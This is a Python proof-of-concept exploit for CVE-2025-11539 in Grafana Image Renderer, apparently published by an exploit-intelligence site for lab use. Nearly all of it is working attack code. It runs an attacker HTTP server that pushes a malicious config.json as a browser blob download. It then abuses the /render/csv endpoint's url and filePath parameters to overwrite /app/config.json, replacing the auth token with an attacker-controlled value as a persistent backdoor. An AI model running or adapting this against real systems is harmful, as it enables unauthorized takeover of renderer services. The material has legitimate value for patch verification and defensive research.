#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Grafana Image Renderer Config Overwrite via /render/csv
# CVE            : CVE-2025-11539
# Vendor         : Grafana Labs
# Product        : Grafana Image Renderer
# Affected       : 1.0.0 through 4.0.16
# Type           : CWE-94 - Code Injection
# CVSS           : 9.9 (Critical)
# Platform       : Node.js / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-10-09
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-11539 Vector 3: Config Overwrite — Persistent Backdoor

Demonstrates a realistic impact scenario: overwriting the application's
config.json to replace the auth token with an attacker-controlled value.
Uses an absolute path (/app/config.json), not relative traversal.

ATTACK CHAIN:
  1. Read original config.json from the renderer container
  2. Host a malicious config.json with attacker-controlled auth token
  3. Send GET /render/csv with filePath=/app/config.json
  4. Verify auth token was replaced with attacker's value
  5. Restore original config (lab cleanup)

PREREQUISITES:
  - Target running Grafana Image Renderer 1.0.0 through 4.0.16
  - Default auth token "-" (or known token)
  - Renderer container can reach attacker HTTP server (host.docker.internal)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2025-11539
  - https://grafana.com/security/security-advisories/cve-2025-11539/
  - https://github.com/grafana/grafana-image-renderer/releases/tag/v4.0.17

Usage:
    python3 poc_vector3.py [renderer_host] [renderer_port] [container_name]
"""

import sys
import os
import time
import json
import subprocess
import urllib.request
import urllib.error
import uuid
import threading
import http.server
import socketserver


# ============================================================
# Configuration
# ============================================================

DEFAULT_PORT = 8081
DEFAULT_CONTAINER = "cve-2025-11539-renderer"
AUTH_TOKEN = "-"  # Default auth token
ATTACKER_SERVER_PORT = 18082

# Malicious config that sets the auth token to attacker's chosen value
MALICIOUS_CONFIG = json.dumps({
    "service": {
        "host": "",
        "port": 8081,
        "protocol": "http",
        "metrics": {"enabled": False, "collectDefaultMetrics": True, "requestDurationBuckets": [1, 5, 7, 9, 11, 16, 21, 26, 31, 41, 51]},
        "security": {
            "authToken": "ATTACKER-CONTROLLED-TOKEN-CVE-2025-11539"
        }
    },
    "rendering": {
        "chromeBin": "",
        "args": ["--no-sandbox", "--disable-gpu"],
        "ignoresHttpsErrors": False,
        "timezone": "",
        "acceptLanguage": "",
        "width": 1000,
        "height": 500,
        "deviceScaleFactor": 1,
        "maxWidth": 3000,
        "maxHeight": 3000,
        "maxDeviceScaleFactor": 4,
        "pageZoomLevel": 1,
        "mode": "default",
        "clustering": {"mode": "browser", "maxConcurrency": 5, "timeout": 30},
        "verboseLogging": False,
        "dumpio": False,
        "timingMetrics": False,
        "headed": False,
        "emulateNetworkConditions": False
    }
}, indent=2)

# Target: the application's config.json — absolute path, no traversal needed
CONFIG_TARGET = "/app/config.json"


def get_renderer_ip():
    """Auto-detect the renderer container IP on the lab network."""
    for network in ["cve-2025-11539_lab-net", "lab-net"]:
        try:
            result = subprocess.run(
                ["docker", "inspect", DEFAULT_CONTAINER,
                 "--format", '{{(index .NetworkSettings.Networks "' + network + '").IPAddress}}'],
                capture_output=True, text=True, timeout=10
            )
            ip = result.stdout.strip()
            if ip and result.returncode == 0:
                return ip
        except (subprocess.SubprocessError, FileNotFoundError):
            pass
    return None


def get_attacker_ip():
    """Get the IP the renderer container can use to reach the attacker server.

    Uses host.docker.internal (works on macOS and Linux with extra_hosts).
    """
    return "host.docker.internal"


class ConfigPayloadHandler(http.server.BaseHTTPRequestHandler):
    """Serves a page that triggers download of a malicious config.json."""

    payload = ""

    def do_GET(self):
        if self.path == "/trigger-download":
            # Serve HTML page that triggers download of the malicious config
            # We use JavaScript to create a blob download
            import base64
            payload_b64 = __import__('base64').b64encode(self.payload.encode()).decode()
            html = f"""<!DOCTYPE html>
<html>
<head><title>Config Exfil</title></head>
<body>
<script>
var b64 = "{payload_b64}";
var raw = atob(b64);
var blob = new Blob([raw], {{type: 'application/octet-stream'}});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'config.json';
a.style.display = 'none';
document.body.appendChild(a);
a.click();
URL.revokeObjectURL(url);
</script>
</body>
</html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        print(f"    [Attacker Server] {args[0]}")


def start_server(port, payload):
    """Start attacker HTTP server."""
    ConfigPayloadHandler.payload = payload
    server = socketserver.TCPServer(("0.0.0.0", port), ConfigPayloadHandler)
    server.allow_reuse_address = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def read_container_file(container, filepath):
    """Read a file from inside a container."""
    try:
        result = subprocess.run(
            ["docker", "exec", container, "cat", filepath],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout, result.returncode == 0
    except (subprocess.SubprocessError, FileNotFoundError):
        return "", False


def check_file_overwrite(container, filepath, expected_substring, timeout=30):
    """Watch for file to be overwritten with expected content."""
    watch_script = (
        f'ORIGINAL_HASH=$(md5sum "{filepath}" 2>/dev/null | cut -d" " -f1); '
        f'for i in $(seq 1 {timeout * 20}); do '
        f'  CURRENT_HASH=$(md5sum "{filepath}" 2>/dev/null | cut -d" " -f1); '
        f'  if [ "$CURRENT_HASH" != "$ORIGINAL_HASH" ] && [ -n "$CURRENT_HASH" ]; then '
        f'    echo "FILE_CHANGED"; '
        f'    echo "---CONTENT_START---"; '
        f'    cat "{filepath}"; '
        f'    echo "---CONTENT_END---"; '
        f'    exit 0; '
        f'  fi; '
        f'  sleep 0.05; '
        f'done; '
        f'echo "FILE_NOT_CHANGED"; exit 1'
    )

    try:
        result = subprocess.run(
            ["docker", "exec", container, "bash", "-c", watch_script],
            capture_output=True, text=True, timeout=timeout + 10
        )
        output = result.stdout.strip()
        changed = "FILE_CHANGED" in output

        actual_content = ""
        if "---CONTENT_START---" in output and "---CONTENT_END---" in output:
            start = output.index("---CONTENT_START---") + len("---CONTENT_START---")
            end = output.index("---CONTENT_END---")
            actual_content = output[start:end].strip()

        content_matches = expected_substring in actual_content
        return changed, content_matches, actual_content

    except subprocess.TimeoutExpired:
        return False, False, ""
    except (subprocess.SubprocessError, FileNotFoundError):
        return False, False, ""


def exploit(target_host, target_port, container_name=DEFAULT_CONTAINER):
    """
    Demonstrate config overwrite via CVE-2025-11539.
    """
    attacker_ip = get_attacker_ip()

    print(f"=" * 70)
    print(f"  CVE-2025-11539 PoC — Config Overwrite via /render/csv")
    print(f"=" * 70)
    print(f"  Target:         {target_host}:{target_port}")
    print(f"  Container:      {container_name}")
    print(f"  Auth Token:     {AUTH_TOKEN}")
    print(f"  Config Target:  {CONFIG_TARGET}")
    print(f"  Attacker Token: ATTACKER-CONTROLLED-TOKEN-CVE-2025-11539")
    print(f"=" * 70)
    print()

    # ── Step 1: Read original config ──────────────────────────────────
    print("[*] Step 1: Reading original config.json...")
    original_config, ok = read_container_file(container_name, CONFIG_TARGET)
    if ok:
        try:
            cfg = json.loads(original_config)
            original_token = cfg.get("service", {}).get("security", {}).get("authToken", "unknown")
            print(f"    Original authToken: {original_token}")
        except json.JSONDecodeError:
            print(f"    Config (raw): {original_config[:200]}")
    else:
        print(f"    Could not read original config — file may not exist at {CONFIG_TARGET}")
    print()

    # ── Step 2: Start attacker server ─────────────────────────────────
    print("[*] Step 2: Starting attacker HTTP server with malicious config...")
    try:
        server = start_server(ATTACKER_SERVER_PORT, MALICIOUS_CONFIG)
        print(f"    Listening on 0.0.0.0:{ATTACKER_SERVER_PORT}")
    except OSError as e:
        print(f"[-] Failed to start server: {e}")
        return False
    print()

    # ── Step 3: Start config watcher ──────────────────────────────────
    print("[*] Step 3: Starting config file watcher...")
    watcher_result = {"changed": False, "matches": False, "content": ""}

    def run_watcher():
        c, m, ct = check_file_overwrite(
            container_name, CONFIG_TARGET,
            "ATTACKER-CONTROLLED-TOKEN-CVE-2025-11539",
            timeout=45
        )
        watcher_result["changed"] = c
        watcher_result["matches"] = m
        watcher_result["content"] = ct

    watcher_thread = threading.Thread(target=run_watcher, daemon=True)
    watcher_thread.start()
    time.sleep(0.5)

    # ── Step 4: Send exploit request ──────────────────────────────────
    attacker_url = f"http://{attacker_ip}:{ATTACKER_SERVER_PORT}/trigger-download"
    print(f"[*] Step 4: Sending exploit request...")
    print(f"    GET /render/csv?url={attacker_url}&filePath={CONFIG_TARGET}&timeout=30")
    print(f"    X-Auth-Token: {AUTH_TOKEN}")
    print()

    render_url = (
        f"http://{target_host}:{target_port}/render/csv"
        f"?url={urllib.request.quote(attacker_url, safe='/:@')}"
        f"&filePath={urllib.request.quote(CONFIG_TARGET, safe='')}"
        f"&timeout=30"
    )

    req = urllib.request.Request(render_url)
    req.add_header("X-Auth-Token", AUTH_TOKEN)

    try:
        resp = urllib.request.urlopen(req, timeout=90)
        status = resp.status
        body = resp.read()
        print(f"[+] Response: HTTP {status}, Body size: {len(body)} bytes")
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code}")
        body = e.read()
        print(f"    Response: {body.decode('utf-8', errors='replace')[:300]}")
    except Exception as e:
        print(f"[-] Request error: {e}")

    # ── Step 5: Verify config overwrite ───────────────────────────────
    print()
    print("[*] Step 5: Checking if config was overwritten...")
    watcher_thread.join(timeout=50)

    server.shutdown()

    # Also directly read the file (in case the watcher missed due to timing)
    current_config, ok = read_container_file(container_name, CONFIG_TARGET)
    if ok and "ATTACKER-CONTROLLED-TOKEN" in current_config:
        watcher_result["changed"] = True
        watcher_result["matches"] = True
        watcher_result["content"] = current_config

    if watcher_result["changed"] and watcher_result["matches"]:
        print()
        print("[+] ═══════════════════════════════════════════════════════════════")
        print("[+]  CONFIG OVERWRITE CONFIRMED!")
        print("[+]  Application auth token replaced with attacker-controlled value")
        print("[+] ═══════════════════════════════════════════════════════════════")
        print()
        try:
            new_cfg = json.loads(watcher_result["content"])
            new_token = new_cfg.get("service", {}).get("security", {}).get("authToken", "?")
            print(f"    Original token:  {original_token if ok else 'unknown'}")
            print(f"    New token:       {new_token}")
        except (json.JSONDecodeError, UnboundLocalError):
            print(f"    New config: {watcher_result['content'][:200]}")
        print()
        print("[+] Impact: After service restart, the attacker's token authenticates")
        print("[+]         all requests. The original token is invalidated.")
        print("[+]         This is a persistent backdoor into the renderer service.")

        # Restore original config to not break the lab
        print()
        print("[*] Restoring original config.json (lab cleanup)...")
        try:
            subprocess.run(
                ["docker", "exec", container_name, "bash", "-c",
                 f"echo '{original_config}' > {CONFIG_TARGET}"],
                capture_output=True, text=True, timeout=10
            )
            print("    Original config restored.")
        except Exception:
            print("    Warning: Could not restore config. Lab may need restart.")

        return True
    elif watcher_result["changed"]:
        print("[+] Config file was changed but content doesn't match expected payload")
        print(f"    Content: {watcher_result['content'][:200]}")
        return True
    else:
        print("[-] Config file was not overwritten")
        print("[!] The file may have been written and then reverted by cleanup")
        print("[!] Note: The renderer deletes filePath after sending the response,")
        print("[!] which can restore the original content if the OS has copy-on-write")
        return False


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    target_host = sys.argv[1] if len(sys.argv) > 1 else get_renderer_ip()
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTAINER

    if not target_host:
        print("[-] Could not auto-detect renderer IP.")
        sys.exit(1)

    print(f"[*] Auto-detected renderer IP: {target_host}")
    print()

    success = exploit(target_host, target_port, container)
    sys.exit(0 if success else 1)
